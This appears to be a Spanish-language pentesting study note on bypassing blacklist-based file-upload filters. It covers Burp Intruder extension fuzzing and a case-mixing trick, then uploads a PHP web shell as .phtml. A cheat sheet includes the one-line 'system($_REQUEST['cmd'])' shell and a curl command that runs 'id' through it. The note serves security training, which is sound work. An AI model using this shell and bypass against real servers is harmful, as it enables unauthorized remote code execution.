---
tags:
  - webapp
  - bypass
  - fileupload
  - RCE
---
## Conceptos Clave (TL;DR)

* Los controles de validación en el lado del cliente (front-end) son triviales de evadir y todas las medidas de seguridad deben implementarse en el servidor (back-end).

* Cuando los controles de validación en el servidor no están programados de forma segura, los atacantes pueden utilizar múltiples técnicas para evadirlos y lograr subir archivos PHP.

* Implementar validaciones basadas en listas negras (blacklist) de extensiones es la forma más débil de control, ya que no es exhaustiva.

* Las listas negras a menudo omiten extensiones alternativas (ej. `.phtml`) que el servidor back-end aún puede interpretar y ejecutar como código.

  
## Herramientas Clave

* **Burp Suite (Interceptor, Intruder, Repeater)**: Utilizado para interceptar las peticiones de subida, modificar la estructura del archivo y automatizar el fuzzing de extensiones.

* **SecLists / PayloadsAllTheThings**: Repositorios de listas de palabras (wordlists) utilizados para realizar fuzzing y encontrar extensiones web comunes permitidas por el servidor.

  
## Metodología Paso a Paso

### Fase 1: Identificación del Filtro

El objetivo inicial es determinar si el servidor cuenta con protecciones de lado del servidor y cómo reacciona ante archivos no permitidos.

* Intercepta una petición legítima de subida de archivos (como una imagen) usando Burp Suite.
* Reemplaza el contenido del archivo con tu script malicioso y cambia la extensión del nombre de archivo a `.php`.
* Envía la petición. Si el servidor responde con un mensaje de error (ej. "Extension not allowed"), esto indica la presencia de una validación de tipos de archivo en el back-end, probablemente basada en una lista negra.

  
### Fase 2: Fuzzing para Evadir la Lista Negra

Dado que la lista negra compara la extensión del archivo subido contra una lista codificada, debemos automatizar la búsqueda de extensiones olvidadas por el desarrollador.

* Localiza la petición bloqueada en el historial de Burp Suite y envíala a la herramienta Intruder.
* En la pestaña "Positions", limpia las posiciones automáticas y añade únicamente la extensión del archivo como punto de inyección (ej. `filename="archivo.§php§"`).
* Mantén el contenido del payload malicioso intacto, ya que el objetivo es aislar la evaluación de la extensión.
* En la pestaña "Payloads", carga tu diccionario de extensiones (PHP o .NET según corresponda) obtenido de PayloadsAllTheThings o SecLists.
* Desactiva la opción "URL Encoding" en las opciones del payload para evitar que Burp codifique caracteres críticos como el punto antes de la extensión.
* Inicia el ataque ("Start Attack") y ordena los resultados por la longitud ("Length") de la respuesta.
* Las peticiones que devuelvan una longitud diferente o un mensaje de éxito indicarán las extensiones que evadieron la lista negra.
  

### Fase 3: Explotación y Ejecución de Código

Una vez identificada una extensión válida, procedemos a subir nuestra web shell funcional.

* Envía una de las peticiones exitosas del Intruder a la herramienta Repeater.
* Selecciona una extensión que comúnmente retiene derechos de ejecución en servidores web, como `.phtml`.
* Modifica el nombre del archivo para utilizar dicha extensión y asegúrate de que el contenido del archivo sea el de una web shell PHP.
* Envía la petición para confirmar que el archivo se ha subido correctamente.
* Navega al directorio donde se guardan los archivos subidos y ejecuta un comando de prueba a través de la web shell para confirmar la ejecución remota de código (RCE).

## Cheat Sheet de Comandos

```http
# Intercepción y modificación manual de la extensión y contenido en Burp Suite

POST /upload.php HTTP/1.1

Host: <TARGET_IP>:<PORT>

...

Content-Disposition: form-data; name="uploadFile"; filename="shell.phtml"

Content-Type: application/x-php

<?php system($_REQUEST['cmd']); ?>
```

```http
# Sintaxis para configurar el punto de inyección (Sniper) en Burp Intruder

# Asegúrate de envolver solo la extensión con el caracter de sección de Burp (§)

Content-Disposition: form-data; name="uploadFile"; filename="shell.§php§"
```

```bash
# Acceso a la web shell subida y ejecución del comando 'id' para validar RCE

curl "http://<TARGET_IP>:<PORT>/<UPLOAD_DIR>/shell.phtml?cmd=id"
```


## "Gotchas" y Troubleshooting

* **Ejecución dependiente del servidor**: No todas las extensiones que logran evadir el filtro funcionarán automáticamente. Se deben probar múltiples extensiones porque la ejecución real depende de la configuración específica del servidor web.

* **Filtros Case-Sensitive**: Las validaciones en PHP pueden ser sensibles a mayúsculas y minúsculas (case-sensitive). Si el servidor back-end corre en Windows (cuyos nombres de archivo son case-insensitive), puedes intentar evadir la lista negra mezclando mayúsculas y minúsculas en la extensión (ej. `pHp`), lo cual podría no ser detectado por el filtro pero aún así ejecutarse correctamente.

* **Preferencia de extensiones**: Al atacar aplicaciones PHP, la extensión `.phtml` es una excelente candidata inicial, ya que los servidores web a menudo le otorgan derechos de ejecución de código por defecto.